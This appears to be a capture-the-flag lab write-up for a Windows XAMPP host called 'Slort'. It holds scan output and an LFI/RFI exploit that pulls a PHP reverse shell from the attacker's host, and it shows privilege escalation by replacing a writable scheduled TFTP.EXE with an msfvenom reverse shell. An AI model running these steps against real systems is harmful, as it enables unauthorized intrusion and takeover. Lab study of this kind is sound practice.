@@ -1,0 +1,91 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.145.53 > Slort.txt
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
+4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.145.53:4443/dashboard/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-open-proxy: Proxy might be redirecting requests
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.145.53:8080/dashboard/
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-05-08T03:39:52
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+
+$ gobuster dir -u http://192.168.145.53:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+site                 (Status: 200)
+http://192.168.145.53:8080/dashboard/phpinfo.php
+found some directory.
+http://192.168.145.53:4443/site/index.php?page=main.php # Found LFI pattern.
+http://192.168.145.53:4443/site/index.php?page=../../../../../xampp\apache\bin\curl-ca-bundle.crt # confirm LFI vulnerable.
+make a shell.php from revshell PHP Ivan Sincek. 
+http://192.168.145.53:4443/site/index.php?page=http://192.168.45.233/shell4444.php # Try RFI after can not find useful info from LFI
+
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.233] from (UNKNOWN) [192.168.145.53] 51126
+SOCKET: Shell has connected! PID: 1472
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\site>whoami
+slort\rupert
+
+PS C:\Backup> cat info.txt
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+
+PS C:\backup> icacls TFTP.EXE
+TFTP.EXE BUILTIN\Users:(I)(F)
+         BUILTIN\Administrators:(I)(F)
+         NT AUTHORITY\SYSTEM:(I)(F)
+         NT AUTHORITY\Authenticated Users:(I)(M)
+Found have F permission. replace TFTP.exe with msfvenom reverse shell. Then wait.
+
+$ rlwrap nc -nlvp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.233] from (UNKNOWN) [192.168.145.53] 51231
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+slort\administrator
+
+
+
+
+
+
+
+
+
